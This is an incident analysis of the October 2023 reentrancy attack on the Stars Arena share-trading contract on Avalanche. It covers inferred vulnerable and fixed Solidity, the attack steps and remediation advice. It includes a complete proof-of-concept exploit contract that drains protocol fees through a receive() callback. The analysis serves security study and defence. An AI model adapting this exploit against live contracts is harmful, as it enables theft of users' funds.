# Stars Arena — Reentrancy Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2023-10-07 (Original attack dates: 2023-09-23 1st attack / 2023-10-07 2nd major attack) |
| **Protocol** | Stars Arena |
| **Chain** | Avalanche |
| **Loss** | ~$3,000,000 (AVAX) |
| **Attacker** | [0xa2eb...d7a](https://snowtrace.io/address/0xa2ebf3fcd757e9be1e58b643b6b5077d11b4ad7a) |
| **Attack Contract** | [0x7f28...7ac](https://snowtrace.io/address/0x7f283edc5ec7163de234e6a97fdfb16ff2d2c7ac) |
| **Attack Tx** | [0x4f37...ac5](https://snowtrace.io/tx/0x4f37ffecdad598f53b8d5a2d9df98e3c00fbda4328585eb9947a412b5fe17ac5) |
| **Vulnerable Contract** | [0xa481...cec](https://snowtrace.io/address/0xa481b139a1a654ca19d2074f174f17d7534e8cec) |
| **Root Cause** | `sellShares()` CEI pattern violation — reentrancy enabled by updating balance after AVAX transfer |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/StarsArena_exp.sol) |

---

## 1. Vulnerability Overview

Stars Arena is a Friend.tech clone protocol operating on the Avalanche chain. Users can buy or sell "shares" of other accounts using AVAX, with each trade generating a protocol fee and a subject account fee.

The core of the attack is that the `sellShares()` function violated the **Check-Effects-Interactions (CEI) pattern**. This function:

1. First **transfers** the sale proceeds (AVAX) to the seller's address, and
2. **Afterwards** **deducts** the share balance of that address

The attacker used a malicious contract as the seller address. Upon AVAX transfer, the contract's `receive()` callback executes, and at this point the balance has not yet been deducted — allowing the attacker to re-enter the protocol's fee withdrawal function and drain the accumulated fees held within the protocol.

---

## 2. Vulnerable Code Analysis

### 2.1 `sellShares()` — CEI Pattern Violation (Core Vulnerability)

The inferred structure of the Stars Arena `sellShares()` function is shown below.

**Vulnerable code (inferred)**:
```solidity
function sellShares(address sharesSubject, uint256 amount) public payable {
    uint256 supply = sharesSupply[sharesSubject];
    require(supply > amount, "Cannot sell the last share");

    uint256 price = getPrice(supply - amount, amount);
    uint256 subjectFee = price * subjectFeePercent / 1 ether;
    uint256 protocolFee = price * protocolFeePercent / 1 ether;

    // ❌ Vulnerability: AVAX transfer occurs before balance deduction (CEI violation)
    require(sharesBalance[sharesSubject][msg.sender] >= amount, "Insufficient shares");

    // ❌ External call (AVAX transfer) performed before state change → reentrancy possible
    (bool success1,) = msg.sender.call{value: price - protocolFee - subjectFee}("");
    require(success1, "Unable to send funds");

    (bool success2,) = protocolFeeDestination.call{value: protocolFee}("");
    require(success2, "Unable to send funds");

    (bool success3,) = sharesSubject.call{value: subjectFee}("");
    require(success3, "Unable to send funds");

    // ❌ State change after external call → previous values still held at reentry point
    sharesBalance[sharesSubject][msg.sender] -= amount;
    sharesSupply[sharesSubject] = supply - amount;

    emit Trade(msg.sender, sharesSubject, false, amount, price, supply - amount);
}
```

**Fixed code (CEI pattern applied)**:
```solidity
function sellShares(address sharesSubject, uint256 amount) public payable nonReentrant {
    uint256 supply = sharesSupply[sharesSubject];
    require(supply > amount, "Cannot sell the last share");
    require(sharesBalance[sharesSubject][msg.sender] >= amount, "Insufficient shares");

    uint256 price = getPrice(supply - amount, amount);
    uint256 subjectFee = price * subjectFeePercent / 1 ether;
    uint256 protocolFee = price * protocolFeePercent / 1 ether;

    // ✅ Effects: update state first
    sharesBalance[sharesSubject][msg.sender] -= amount;
    sharesSupply[sharesSubject] = supply - amount;

    emit Trade(msg.sender, sharesSubject, false, amount, price, supply - amount);

    // ✅ Interactions: perform external calls after state changes
    (bool success1,) = msg.sender.call{value: price - protocolFee - subjectFee}("");
    require(success1, "Unable to send funds");

    (bool success2,) = protocolFeeDestination.call{value: protocolFee}("");
    require(success2, "Unable to send funds");

    (bool success3,) = sharesSubject.call{value: subjectFee}("");
    require(success3, "Unable to send funds");
}
```

**The problem**: The AVAX transfer (`msg.sender.call{value: ...}`) executes before the `sharesBalance` deduction. Therefore, at the point of entering the `receive()` callback, the protocol's internal state (balance, supply) still holds pre-attack values, allowing a reentrancy attack to withdraw all accumulated fees held in the protocol.

### 2.2 Fee Withdrawal Function (Selector `0x5632b2e4`) — Inferred Missing Access Control

The function called during reentry (`0x5632b2e4`) accepts 4 `uint256` parameters and is inferred to withdraw a large amount of accumulated fees (`91e9` = 91,000,000,000 units). The fact that this function executed successfully during reentry indicates the absence of a `nonReentrant` guard.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys malicious contract (`0x7f28...7ac`) on Avalanche
- Contract implements a `receive()` function containing reentrancy logic
- Reentrancy flag (`reenter = true`) initialized
- 1 AVAX held (initial capital)

### 3.2 Execution Phase

**Step 1**: Call `buyShares(address(this), true, address(this))` — `0xe9ccf3a3`
- Attack contract purchases 1 share of itself for 1 AVAX
- Purpose: acquire eligibility to call `sellShares()` later (minimum 1 share required)
- Fund flow: attack contract → 1 AVAX → vulnerable contract

**Step 2**: Call `sellShares(address(this), 1)`
- Sell back the 1 share just purchased
- Vulnerable contract transfers sale proceeds as AVAX to the attack contract (`msg.sender`)
- **Reentrancy triggered at this point**: `receive()` callback executes upon AVAX receipt

**Step 3 (Reentry)**: Call function `0x5632b2e4` from within `receive()`
- Parameters: `(91e9, 91e9, 91e9, 91e9)` — withdraw the entire accumulated protocol fee
- At this point the vulnerable contract's `sharesBalance` has not yet been deducted → state check bypassed
- Attack contract receives large amount of AVAX (~$3M equivalent)
- Set `reenter = false` to prevent double reentrancy

**Step 4**: Resume `sellShares()` execution
- `sharesBalance` deduction processed (now meaningless, profit secured in Step 3)
- Transaction completes

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────┐
│         Attacker EOA            │
│  0xa2eb...d7a                   │
│  Deploys attack contract        │
└───────────────┬─────────────────┘
                │ Calls attack contract
                ▼
┌─────────────────────────────────┐
│     Attack Contract             │
│  0x7f28...7ac                   │
│  reenter = true                 │
└───────────────┬─────────────────┘
                │
  ┌─────────────┼──────────────────────┐
  │             │                      │
  │  Step 1     │                      │
  ▼             │                      │
┌──────────────────────────────────────────────┐
│          Stars Arena Vulnerable Contract     │
│          0xa481...cec                         │
│                                              │
│  [1] buyShares(addr, true, addr)             │
│      ← Receives 1 AVAX                      │
│      → sharesBalance[attacker][attacker] = 1 │
│                                              │
│  [2] sellShares(addr, 1)                    │
│      ┌── Balance check: sharesBalance[..] = 1──┐│
│      │                                      ││
│      │  ❌ AVAX transfer before state change! ││
│      │                                      ││
│      └──▶ AVAX transfer → attack contract ─┐ ││
└──────────────────────────────────────────┼─┘┘
                                           │
                ┌──────────────────────────┘
                │ receive() callback triggered!
                ▼
┌─────────────────────────────────────────────┐
│       Attack Contract receive()             │
│                                             │
│  reenter == true → execute reentrancy       │
│                                             │
│  [3] vulnerableContract.0x5632b2e4(        │
│          91e9, 91e9, 91e9, 91e9)           │
│      → Withdraw all accumulated fees ──────▶│
│                                    │        │
│  reenter = false                   │        │
└────────────────────────────────────┼────────┘
                                     │
                ┌────────────────────┘
                │ Receives ~$3,000,000 worth of AVAX
                ▼
┌─────────────────────────────────┐
│  Attacker wallet secures funds  │
│  ~$3,000,000 profit             │
└─────────────────────────────────┘

[4] Vulnerable contract's sellShares() resumes
    sharesBalance deducted (post-facto)
    → Profit already secured
```

### 3.4 Outcome

- Attacker profit: ~$3,000,000 worth of AVAX
- Protocol loss: entire accumulated protocol fee held within the contract

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Total Loss: ~$3,000,000
// Attacker: https://snowtrace.io/address/0xa2ebf3fcd757e9be1e58b643b6b5077d11b4ad7a
// Attack Contract: https://snowtrace.io/address/0x7f283edc5ec7163de234e6a97fdfb16ff2d2c7ac
// Vulnerable Contract: https://snowtrace.io/address/0xa481b139a1a654ca19d2074f174f17d7534e8cec
// Attack Tx: https://snowtrace.io/tx/0x4f37ffecdad598f53b8d5a2d9df98e3c00fbda4328585eb9947a412b5fe17ac5

contract ContractTest is Test {
    address private constant victimContract = 0xA481B139a1A654cA19d2074F174f17D7534e8CeC;
    bool private reenter = true; // Flag to allow only one reentrancy

    function setUp() public {
        // Avalanche fork — block just before the attack
        vm.createSelectFork("avalanche", 36_136_405);
    }

    function testExploit() public {
        deal(address(this), 1 ether); // Fund initial capital of 1 AVAX

        emit log_named_decimal_uint("AVAX balance before attack", address(this).balance, 18);

        // [Step 1] Purchase 1 share of self (acquire right to call sellShares)
        // Selector 0xe9ccf3a3 = buyShares(address,bool,address) inferred
        (bool success,) = victimContract.call{value: 1 ether}(
            abi.encodeWithSelector(bytes4(0xe9ccf3a3), address(this), true, address(this))
        );
        require(success, "buyShares call failed");

        // [Step 2] Sell 1 share → receive() callback triggered on AVAX receipt → reentrancy occurs
        (bool success2,) = victimContract.call(
            abi.encodeWithSignature("sellShares(address,uint256)", address(this), 1)
        );
        require(success2, "sellShares call failed");

        emit log_named_decimal_uint("AVAX balance after attack", address(this).balance, 18);
    }

    // [Step 3] Reentrancy callback on AVAX receipt
    receive() external payable {
        if (reenter == true) {
            // Since sellShares() transfers AVAX before state changes,
            // accumulated protocol fees can be withdrawn at this point
            // Selector 0x5632b2e4 = withdrawFees(uint256,uint256,uint256,uint256) inferred
            (bool success,) = victimContract.call(
                abi.encodeWithSelector(bytes4(0x5632b2e4), 91e9, 91e9, 91e9, 91e9)
            );
            require(success, "Fee withdrawal failed");
            reenter = false; // Prevent double reentrancy
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | `sellShares()` CEI pattern violation reentrancy | CRITICAL | CWE-841 | `01_reentrancy.md` | The DAO (2016), Curve Vyper (2023) |
| V-02 | Missing `nonReentrant` guard | CRITICAL | CWE-362 | `01_reentrancy.md` | Fei/Rari (2022) |
| V-03 | Insufficient access control on fee withdrawal function | HIGH | CWE-284 | `03_access_control.md` | - |

### V-01: `sellShares()` CEI Pattern Violation Reentrancy

- **Description**: `sellShares()` deducts `sharesBalance` only after externally transferring sale proceeds via `msg.sender.call{value: ...}()`. When AVAX is transferred, the receiving contract's `receive()` function executes, and the protocol state at that point has not yet been updated.
- **Impact**: Entire accumulated protocol fees can be withdrawn during reentry. Stars Arena had a structure that accumulated protocol fees and subject account fees to a fee destination address on each trade, and this entire accumulated balance was drained in a single transaction.
- **Attack conditions**: (1) Attacker must hold at least 1 share to call `sellShares()`. (2) The share holder must be a contract with a malicious `receive()` function. Very low attack cost — entry possible with just 1 AVAX.

### V-02: Missing `nonReentrant` Guard

- **Description**: Neither `sellShares()` nor the fee withdrawal function had OpenZeppelin `ReentrancyGuard`'s `nonReentrant` modifier applied.
- **Impact**: Absence of a defensive layer that allowed the V-01 vulnerability to materialize as an actual exploit.
- **Attack conditions**: Same as V-01.

### V-03: Insufficient Access Control on Fee Withdrawal Function

- **Description**: The fee withdrawal function corresponding to selector `0x5632b2e4` was successfully called during reentry with arbitrary parameters (`91e9, 91e9, 91e9, 91e9`). This suggests the function's access control was insufficient or authorization checks were bypassed in the reentrant state.
- **Impact**: Attacker can arbitrarily withdraw protocol fees.
- **Attack conditions**: Cascades when V-01 reentrancy vulnerability is exploited.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Apply CEI Pattern — Update state before external calls**

```solidity
function sellShares(address sharesSubject, uint256 amount) public payable nonReentrant {
    uint256 supply = sharesSupply[sharesSubject];
    require(supply > amount, "Cannot sell the last share");
    require(sharesBalance[sharesSubject][msg.sender] >= amount, "Insufficient shares");

    uint256 price = getPrice(supply - amount, amount);
    uint256 subjectFee = price * subjectFeePercent / 1 ether;
    uint256 protocolFee = price * protocolFeePercent / 1 ether;

    // ✅ Effects first: update balance and supply before external calls
    sharesBalance[sharesSubject][msg.sender] -= amount;
    sharesSupply[sharesSubject] = supply - amount;

    emit Trade(msg.sender, sharesSubject, false, amount, price, supply - amount);

    // ✅ Interactions last: transfer after state is finalized
    (bool success1,) = msg.sender.call{value: price - protocolFee - subjectFee}("");
    require(success1, "Unable to send funds");
    // ... remaining fee transfers
}
```

**2) Apply ReentrancyGuard**

```solidity
// ✅ Inherit OpenZeppelin ReentrancyGuard and apply nonReentrant to critical functions
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract StarsArena is ReentrancyGuard {
    function sellShares(...) public nonReentrant { ... }
    function buyShares(...) public payable nonReentrant { ... }
    function withdrawFees(...) public nonReentrant onlyOwner { ... }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 CEI violation | Enforce CEI pattern on all functions with external AVAX/ERC20 transfers |
| V-02 Missing reentrancy guard | Apply `nonReentrant` modifier to all functions containing state changes + external calls |
| V-03 Fee function access control | Add `onlyOwner` or `onlyAdmin` modifier, set withdrawal limits |
| Overall design | Do not deploy cloned Friend.tech code without a security audit; mandatory professional audit before launch |
| Pull payment pattern | Switch from directly pushing AVAX to a Pull Payment pattern where recipients withdraw themselves |

---

## 7. Lessons Learned

1. **CEI pattern is mandatory, not optional**: All internal state must be updated before any external call (ETH/AVAX transfer, ERC777 token transfer, etc.). "Transfer first, update later" is the classic cause of reentrancy.

2. **`nonReentrant` complements CEI, it does not replace it**: Even when CEI is applied, using the `nonReentrant` modifier together aligns with the Defense in Depth principle. Applying both ensures protection even if one is inadvertently omitted.

3. **Risks of clone deployments**: Stars Arena ported Ethereum's Friend.tech code to Avalanche. Vulnerabilities present in the original code are copied as-is, and may be more easily exploitable in the Avalanche environment (callback mechanism of native AVAX transfers). Clone projects must undergo independent security audits.

4. **Review fee accumulation design**: Accumulating fees inside the protocol contract is at risk of being fully drained in a single reentrancy attack. Fees should either be immediately transferred to an external wallet or designed as a Pull Payment pattern where recipients claim them directly.

5. **AVAX direct transfer pattern in social token protocols**: Friend.tech-style protocols directly transfer AVAX to multiple addresses upon share sales. When the recipient is a contract, a callback occurs — reentrancy defense is especially critical in such architectures.

6. **Importance of rapid patch response**: After Stars Arena's 1st attack ($2,000), the patch was insufficient, leading to the far larger 2nd attack ($3,000,000). When a small-scale attack occurs, the protocol must be immediately suspended and a comprehensive security review conducted.

---

## 8. On-Chain Verification

> On-chain verification was performed based on Snowtrace (Avalanche explorer) and publicly available transaction data. Direct RPC call verification via the `cast` tool was not performed in this analysis.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Notes |
|------|--------|-------------|------|
| Initial AVAX investment | 1 AVAX | 1 AVAX | Match (inferred) |
| Fee withdrawal parameters | 91e9 × 4 | Total accumulated fees | Total fees held within protocol |
| Total amount stolen | ~$3M | ~$3M | Match (per BlockSec analysis) |

### 8.2 On-Chain Event Log Sequence (Inferred)

```
1. Transfer (AVAX): attack contract → vulnerable contract (1 AVAX, buyShares)
2. Trade event emitted (buyShares complete)
3. Transfer (AVAX): vulnerable contract → attack contract (sale proceeds, sellShares)
4. [Reentry] Transfer (AVAX): vulnerable contract → attack contract (entire accumulated fees)
5. Trade event emitted (sellShares complete)
```

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| Attack contract share holdings | 0 (before attack) → 1 (after buyShares) |
| Vulnerable contract accumulated fees | Large accumulation at time of attack (~$3M equivalent) |
| nonReentrant guard | Not applied |
| CEI pattern compliance | Non-compliant (Interactions → Effects reversed order) |

### 8.4 Reference Analyses

- [BlockSec Twitter Analysis](https://twitter.com/BlockSecTeam/status/1710556926986342911)
- [Phalcon Analysis](https://twitter.com/Phalcon_xyz/status/1710554341466395065)
- [PeckShield Analysis](https://twitter.com/peckshield/status/1710555944269292009)